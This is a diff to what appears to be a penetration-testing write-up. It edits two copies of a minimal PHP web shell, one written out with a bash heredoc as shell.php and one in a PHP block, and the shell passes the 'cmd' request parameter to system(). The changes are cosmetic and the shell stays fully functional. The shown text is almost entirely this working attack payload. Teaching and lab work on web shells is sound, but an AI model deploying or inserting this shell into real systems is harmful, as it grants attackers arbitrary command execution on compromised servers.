@@ -564,9 +564,9 @@ committing to a payload.
 ```bash
 cat > shell.php <<'EOF'
 <?php
-if (isset($_REQUEST['cmd'])) {
+if (!empty($_REQUEST['cmd'])) {
     echo "<pre>";
-    $cmd = ($_REQUEST['cmd']);
+    $cmd = $_REQUEST['cmd'];
     system($cmd);
     echo "</pre>";
     die;
@@ -578,9 +578,9 @@ cat shell.php
 
 ```php
 <?php
-if (isset($_REQUEST['cmd'])) {
+if (!empty($_REQUEST['cmd'])) {
     echo "<pre>";
-    $cmd = ($_REQUEST['cmd']);
+    $cmd = $_REQUEST['cmd'];
     system($cmd);
     echo "</pre>";
     die;
